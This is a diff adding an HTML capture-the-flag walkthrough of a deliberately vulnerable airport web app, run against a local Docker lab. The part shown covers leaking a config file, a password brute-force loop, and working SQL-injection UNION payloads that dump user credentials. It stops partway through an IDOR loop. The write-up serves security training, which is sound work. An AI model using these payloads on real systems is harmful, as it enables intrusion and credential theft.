@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>HiveAir CTF — Full Walkthrough</title>
+  <style>
+    html {
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 12px;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      html {
+        background-color: white;
+      }
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    svg {
+      height: auto;
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
+      font-size: 85%;
+      margin: 0;
+      hyphens: manual;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+    /* CSS for syntax highlighting */
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { color: #008000; } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { color: #008000; font-weight: bold; } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">HiveAir CTF — Full Walkthrough</h1>
+</header>
+<h1 id="hiveair-ctf--walkthrough">HiveAir CTF — Walkthrough</h1>
+<p><a href="#flags-captured"><img
+src="https://img.shields.io/badge/flags-7%2F7-success"
+alt="Flags" /></a> <a href="#vulnerabilities"><img
+src="https://img.shields.io/badge/vulnerabilities-10-blue"
+alt="Vulns" /></a> <a href="#"><img
+src="https://img.shields.io/badge/category-web-orange"
+alt="Category" /></a></p>
+<p>Full walkthrough of the HiveAir International Airport CTF — a
+deliberately vulnerable Node/Express web application built by <a
+href="https://www.linkedin.com/in/nana-sei-anyemedu/">Hive Consult</a>
+(Ghana) as part of a public bug-bounty practice series.</p>
+<p>The lab simulates an airport management system with <strong>10
+vulnerabilities</strong> ranging from easy to "god mode." This writeup
+captures all <strong>7 flags</strong> and demonstrates a complete attack
+chain from anonymous reconnaissance to remote code execution as the
+admin user.</p>
+<blockquote>
+<p><strong>Disclosure note:</strong> This lab was made publicly
+available by the author for practice and bug-bounty learning. All
+exploitation was performed against a local Docker instance.</p>
+</blockquote>
+<hr />
+<h2 id="table-of-contents">Table of contents</h2>
+<ol type="1">
+<li><a href="#setup">Setup</a></li>
+<li><a href="#attack-flow-at-a-glance">Attack flow at a glance</a></li>
+<li><a href="#phase-1--reconnaissance">Phase 1 — Reconnaissance</a></li>
+<li><a href="#phase-2--authenticated-foothold">Phase 2 — Authenticated
+foothold</a></li>
+<li><a href="#phase-3--v1-no-rate-limiting">Phase 3 — V1: No rate
+limiting</a></li>
+<li><a href="#phase-4--v2-sql-injection">Phase 4 — V2: SQL
+injection</a></li>
+<li><a href="#phase-5--v3-idor">Phase 5 — V3: IDOR</a></li>
+<li><a href="#phase-6--v6-broken-access-control">Phase 6 — V6: Broken
+access control</a></li>
+<li><a href="#phase-7--v8-ssrf">Phase 7 — V8: SSRF</a></li>
+<li><a href="#phase-8--v9-business-logic-flaw">Phase 8 — V9: Business
+logic flaw</a></li>
+<li><a href="#phase-9--v5-jwt-forgery">Phase 9 — V5: JWT
+forgery</a></li>
+<li><a href="#phase-10--v7--v10-file-upload-to-rce">Phase 10 — V7 + V10:
+File upload to RCE</a></li>
+<li><a href="#flags-captured">Flags captured</a></li>
+<li><a href="#findings-summary">Findings summary</a></li>
+<li><a href="#lessons">Lessons</a></li>
+<li><a href="#credits">Credits</a></li>
+</ol>
+<hr />
+<h2 id="setup">Setup</h2>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">unzip</span> hiveair-ctf.zip <span class="kw">&amp;&amp;</span> <span class="bu">cd</span> hiveair-ctf</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> compose up <span class="at">-d</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-I</span> http://localhost:8090/   <span class="co"># should 302 → /login.html</span></span></code></pre></div>
+<p>Workspace:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> ~/hiveair-pwn <span class="kw">&amp;&amp;</span> <span class="bu">cd</span> ~/hiveair-pwn</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">BASE</span><span class="op">=</span>http://localhost:8090</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> flags.txt notes.md</span></code></pre></div>
+<p>Tools used: <code>curl</code>, <code>jq</code>, <code>node</code>
+(for <code>jsonwebtoken</code>), Firefox + DevTools. Nothing else.</p>
+<hr />
+<h2 id="attack-flow-at-a-glance">Attack flow at a glance</h2>
+<pre><code>Recon (robots.txt, backup config)
+    │
+    └─► JWT_SECRET=hiveair leaked publicly
+            │
+Register passenger → V1 brute-force flag
+            │
+SQLi in flight search → full user dump (passwords + roles)
+            │
+IDOR → other passengers&#39; PII + V3 flag
+            │
+Broken access ctl → security watchlist + V6 flag
+            │
+SSRF → internal /api/internal/config + V8 flag
+            │
+Business logic → book a departed flight for $0 + V9 flag
+            │
+Forge admin JWT (HS256 + leaked secret) + V5 flag
+            │
+Upload PHP shell as image/jpeg → RCE as root → V10 chain flag</code></pre>
+<p>Six of the seven flags fall to a passenger session. The seventh
+requires the forged admin token.</p>
+<p><img src="screenshots/13-login-page.png" alt="Login page" /> <em>The
+target: HiveAir International Airport management system.</em></p>
+<hr />
+<h2 id="phase-1--reconnaissance">Phase 1 — Reconnaissance</h2>
+<p>The first move is mapping the attack surface without touching
+auth.</p>
+<h3 id="11-identify-the-server">1.1 Identify the server</h3>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-I</span> http://localhost:8090/</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="co"># HTTP/1.1 302 Found</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="co"># X-Powered-By: Express</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Location: /login.html</span></span></code></pre></div>
+<p><code>X-Powered-By: Express</code> confirms Node.js. That points to
+JWTs for auth, <code>.env</code> files for config, and
+<code>/api/...</code> routing — patterns to look for later.</p>
+<h3 id="12-robotstxt--the-treasure-map">1.2 robots.txt — the treasure
+map</h3>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> http://localhost:8090/robots.txt</span></code></pre></div>
+<pre><code>Disallow: /admin.html
+Disallow: /api/admin/
+Disallow: /api/internal/
+Disallow: /api/security/
+Disallow: /uploads/
+Disallow: /backup/
+Disallow: /backup/hiveair_config.env
+
+# Admin panel: /admin.html
+# Internal API: /api/internal/config
+# Backup config: /backup/hiveair_config.env</code></pre>
+<p><img src="screenshots/02-robots-txt.png"
+alt="robots.txt enumeration" /> <em>Disallow directives reveal every
+"hidden" path: admin panel, internal API, security namespace, uploads,
+backup.</em></p>
+<p><code>robots.txt</code> is not a security control. It's a
+developer-curated list of sensitive paths, published in plaintext for
+any attacker who knows it exists. Every <code>Disallow:</code> line
+above is now a target.</p>
+<p><img src="screenshots/01-docker-up-and-recon-start.png"
+alt="Recon — robots.txt + initial setup" /> <em>Container running,
+robots.txt enumerating the sensitive paths.</em></p>
+<h3 id="13-fetch-the-leaked-backup">1.3 Fetch the leaked backup</h3>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> http://localhost:8090/backup/hiveair_config.env</span></code></pre></div>
+<pre><code>JWT_SECRET=hiveair
+ADMIN_EMAIL=admin@hiveconsult.com
+ADMIN_PASSWORD=admin123
+STAFF_EMAIL=staff@hiveair.com
+STAFF_PASSWORD=Staff@2024!
+SECURITY_EMAIL=security@hiveair.com
+SECURITY_PASSWORD=Sec@2024!</code></pre>
+<p>The admin password is bad (<code>admin123</code>), but it's
+rotatable. The <code>JWT_SECRET</code> is the real prize — with it, I
+can mint a valid token for any user, any role, at any time, without ever
+knowing a password. The dev would have to change the secret in source
+code and redeploy to lock me out.</p>
+<p><img src="screenshots/03-backup-config-leaked.png"
+alt="Backup config leak" /> <em>The big leak: JWT_SECRET, admin
+credentials, staff credentials, and database path.</em></p>
+<p><strong>Severity:</strong> Critical. Plain <code>.env</code> file
+served from a public directory.</p>
+<hr />
+<h2 id="phase-2--authenticated-foothold">Phase 2 — Authenticated
+foothold</h2>
+<p>Register a passenger account and inspect what the server hands
+back.</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-i</span> <span class="at">-c</span> cookies.txt <span class="at">-X</span> POST http://localhost:8090/api/auth/login <span class="dt">\</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Content-Type: application/json&#39;</span> <span class="dt">\</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-d</span> <span class="st">&#39;{&quot;email&quot;:&quot;hunter@test.com&quot;,&quot;password&quot;:&quot;hunter123&quot;}&#39;</span></span></code></pre></div>
+<pre><code>Set-Cookie: ha_token=eyJ...; Path=/</code></pre>
+<p>Just <code>Path=/</code>. No <code>HttpOnly</code>, no
+<code>Secure</code>, no <code>SameSite</code>. Any JavaScript on the
+page can read this cookie via <code>document.cookie</code>. That means
+if I find a stored-XSS sink elsewhere in the app, I can steal another
+user's session token. File that for later.</p>
+<p>Decoded JWT payload:</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;alg&quot;</span><span class="fu">:</span> <span class="st">&quot;HS256&quot;</span>  <span class="er">//</span> <span class="er">header</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;userId&quot;</span><span class="fu">:</span> <span class="dv">9</span><span class="fu">,</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;uuid&quot;</span><span class="fu">:</span> <span class="st">&quot;eb069364-...&quot;</span><span class="fu">,</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;email&quot;</span><span class="fu">:</span> <span class="st">&quot;hunter@test.com&quot;</span><span class="fu">,</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="st">&quot;Hunter&quot;</span><span class="fu">,</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;role&quot;</span><span class="fu">:</span> <span class="st">&quot;passenger&quot;</span>  <span class="er">//</span> <span class="er">←</span> <span class="er">the</span> <span class="er">field</span> <span class="er">that</span> <span class="er">will</span> <span class="er">matter</span> <span class="er">most</span></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p>HS256 (symmetric signing) + a leaked secret = total auth compromise.
+I just don't use it yet.</p>
+<p><img src="screenshots/04-passenger-dashboard.png"
+alt="Passenger dashboard" /> <em>Logged in as Hunter (registered
+passenger). Baseline established.</em></p>
+<hr />
+<h2 id="phase-3--v1-no-rate-limiting">Phase 3 — V1: No rate
+limiting</h2>
+<h3 id="test">Test</h3>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="va">$(</span><span class="fu">seq</span> 1 20<span class="va">)</span><span class="kw">;</span> <span class="cf">do</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>  <span class="ex">curl</span> <span class="at">-s</span> <span class="at">-o</span> /dev/null <span class="at">-w</span> <span class="st">&quot;%{http_code} &quot;</span> <span class="at">-X</span> POST <span class="va">$BASE</span>/api/auth/login <span class="dt">\</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">-H</span> <span class="st">&#39;Content-Type: application/json&#39;</span> <span class="dt">\</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">-d</span> <span class="st">&quot;{</span><span class="dt">\&quot;</span><span class="st">email</span><span class="dt">\&quot;</span><span class="st">:</span><span class="dt">\&quot;</span><span class="st">passenger@hiveair.com</span><span class="dt">\&quot;</span><span class="st">,</span><span class="dt">\&quot;</span><span class="st">password</span><span class="dt">\&quot;</span><span class="st">:</span><span class="dt">\&quot;</span><span class="st">wrong</span><span class="va">$i</span><span class="dt">\&quot;</span><span class="st">}&quot;</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
+<p>All 20 attempts returned <code>401</code> at 10–12ms each. No
+throttling, no lockout. Confirming with a wordlist:</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> wordlist.txt <span class="op">&lt;&lt;&#39;EOF&#39;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="st">password</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="st">admin</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="st">123456</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="st">Pass@2024!</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="bu">read</span> <span class="at">-r</span> <span class="va">pw</span><span class="kw">;</span> <span class="cf">do</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>  <span class="va">code</span><span class="op">=</span><span class="va">$(</span><span class="ex">curl</span> <span class="at">-s</span> <span class="at">-o</span> /dev/null <span class="at">-w</span> <span class="st">&quot;%{http_code}&quot;</span> <span class="at">-X</span> POST <span class="va">$BASE</span>/api/auth/login <span class="dt">\</span></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>    <span class="at">-H</span> <span class="st">&#39;Content-Type: application/json&#39;</span> <span class="dt">\</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>    <span class="at">-d</span> <span class="st">&quot;{</span><span class="dt">\&quot;</span><span class="st">email</span><span class="dt">\&quot;</span><span class="st">:</span><span class="dt">\&quot;</span><span class="st">passenger@hiveair.com</span><span class="dt">\&quot;</span><span class="st">,</span><span class="dt">\&quot;</span><span class="st">password</span><span class="dt">\&quot;</span><span class="st">:</span><span class="dt">\&quot;</span><span class="va">$pw</span><span class="dt">\&quot;</span><span class="st">}&quot;</span><span class="va">)</span></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>  <span class="bu">echo</span> <span class="st">&quot;  </span><span class="va">$pw</span><span class="st"> → HTTP </span><span class="va">$code</span><span class="st">&quot;</span></span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>  <span class="bu">[</span> <span class="st">&quot;</span><span class="va">$code</span><span class="st">&quot;</span> <span class="ot">=</span> <span class="st">&quot;200&quot;</span> <span class="bu">]</span> <span class="kw">&amp;&amp;</span> <span class="bu">echo</span> <span class="st">&quot;FOUND: </span><span class="va">$pw</span><span class="st">&quot;</span> <span class="kw">&amp;&amp;</span> <span class="cf">break</span></span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span> <span class="op">&lt;</span> wordlist.txt</span></code></pre></div>
+<p>Hit on attempt 4. In a real engagement: rockyou.txt + hydra +
+parallel connections = compromise of any weak password in seconds.</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-s</span> <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer </span><span class="va">$TOKEN</span><span class="st">&quot;</span> <span class="va">$BASE</span>/api/internal/bruteforce-flag</span></code></pre></div>
+<p>🚩 <code>FLAG{n0_r4t3_l1m1t_br3ach3d_br4v0}</code></p>
+<p><img src="screenshots/05-v1-bruteforce-flag.png"
+alt="V1 brute-force" /> <em>20 failed attempts with no throttling,
+wordlist hit on attempt 4, flag captured.</em></p>
+<hr />
+<h2 id="phase-4--v2-sql-injection">Phase 4 — V2: SQL injection</h2>
+<p>The <code>/api/internal/sqlmap-hint</code> endpoint already names the
+vulnerable endpoint, but the discovery path is worth running anyway.</p>
+<h3 id="confirm-injection-error-based">Confirm injection
+(error-based)</h3>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-s</span> <span class="st">&quot;</span><span class="va">$BASE</span><span class="st">/api/flights/search?q=%27&quot;</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="co"># {&quot;error&quot;:&quot;SQLITE_ERROR: unrecognized token: \&quot;&#39;\&quot;&quot;,&quot;query&quot;:&quot;&#39;&quot;}</span></span></code></pre></div>
+<p>The error message confirms three things at once: it's SQLite, the
+input is concatenated directly into the query, and the server echoes the
+input back in the error response.</p>
+<h3 id="boolean-sqli">Boolean SQLi</h3>
+<p>First attempt with <code>' OR '1'='1</code> returned 0 results — the
+trailing <code>%'</code> from the original <code>LIKE '%${q}%'</code>
+glued onto the <code>1</code>, making the comparison
+<code>'1'='1%'</code> (false). The fix: terminate the trailing SQL with
+<code>--</code>:</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sG</span> <span class="st">&quot;</span><span class="va">$BASE</span><span class="st">/api/flights/search&quot;</span> <span class="dt">\</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-urlencode</span> <span class="st">&quot;q=zzzz&#39; OR &#39;1&#39;=&#39;1&#39; --&quot;</span> <span class="kw">|</span> <span class="ex">jq</span> <span class="st">&#39;.flights | length&#39;</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="co"># 8 (all flights returned for a nonsense search term)</span></span></code></pre></div>
+<h3 id="union-dump--exfiltrate-users">UNION dump — exfiltrate users</h3>
+<p>The flights table has 13 columns. UNION SELECT must match.</p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sG</span> <span class="st">&quot;</span><span class="va">$BASE</span><span class="st">/api/flights/search&quot;</span> <span class="dt">\</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-urlencode</span> <span class="st">&quot;q=x&#39; UNION SELECT id,email,password,name,role,passport,nationality,1,1,1,1,1,1 FROM users--&quot;</span> <span class="dt">\</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">|</span> <span class="ex">jq</span> <span class="st">&#39;.flights&#39;</span></span></code></pre></div>
+<p>Result: every user, every plaintext password, every role — including
+admin and ops credentials not present in the backup file.</p>
+<table>
+<thead>
+<tr class="header">
+<th>id</th>
+<th>email</th>
+<th>password</th>
+<th>role</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>1</td>
+<td><a
+href="mailto:admin@hiveconsult.com">admin@hiveconsult.com</a></td>
+<td>admin123</td>
+<td>admin</td>
+</tr>
+<tr class="even">
+<td>2</td>
+<td><a href="mailto:ops@hiveair.com">ops@hiveair.com</a></td>
+<td>OpsHive@24</td>
+<td>admin</td>
+</tr>
+<tr class="odd">
+<td>3</td>
+<td><a href="mailto:staff@hiveair.com">staff@hiveair.com</a></td>
+<td>Staff@2024!</td>
+<td>staff</td>
+</tr>
+<tr class="even">
+<td>4</td>
+<td><a href="mailto:security@hiveair.com">security@hiveair.com</a></td>
+<td>Sec@2024!</td>
+<td>security</td>
+</tr>
+<tr class="odd">
+<td>5</td>
+<td><a
+href="mailto:passenger@hiveair.com">passenger@hiveair.com</a></td>
+<td>Pass@2024!</td>
+<td>passenger</td>
+</tr>
+<tr class="even">
+<td>6</td>
+<td><a href="mailto:alice@globalair.io">alice@globalair.io</a></td>
+<td>Alice#2024</td>
+<td>passenger</td>
+</tr>
+<tr class="odd">
+<td>7</td>
+<td><a href="mailto:bob@travelplus.com">bob@travelplus.com</a></td>
+<td>Bob$Travel9</td>
+<td>passenger</td>
+</tr>
+<tr class="even">
+<td>8</td>
+<td><a href="mailto:charlie@nexusfly.net">charlie@nexusfly.net</a></td>
+<td>Charlie!99</td>
+<td>passenger</td>
+</tr>
+</tbody>
+</table>
+<p><img src="screenshots/06-v2-sqli-user-dump.png" alt="V2 SQLi dump" />
+<em>UNION-based SQLi dumping the entire users table through a public,
+unauthenticated search endpoint.</em></p>
+<p><strong>No flag awarded for V2 — the data dump is the prize.</strong>
+Pre-auth full database disclosure with plaintext passwords. Critical
+severity.</p>
+<hr />
+<h2 id="phase-5--v3-idor">Phase 5 — V3: IDOR</h2>
+<p><code>/api/bookings/:id</code> requires authentication but does not
+check ownership.</p>
+<div class="sourceCode" id="cb18"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> 1 2 3 4 5<span class="kw">;</span> <span class="cf">do</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>  <span class="ex">curl</span> <span class="at">-s</span> <span class="at">-H</span> <span class="st">&quot;Authorization: Bearer </span><span class="va">$TOKEN</span><span class="st">&quot;</span> <span class="va">$BASE</span>/api/bookings/<span class="va">$i</span> <span class="dt">\</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">|</span> <span class="ex">jq</span> <span class="st">&#39;{passenger_name: .booking.passenger_name, passport: .booking.passport_number, hive_flag}&#39;</span></span>
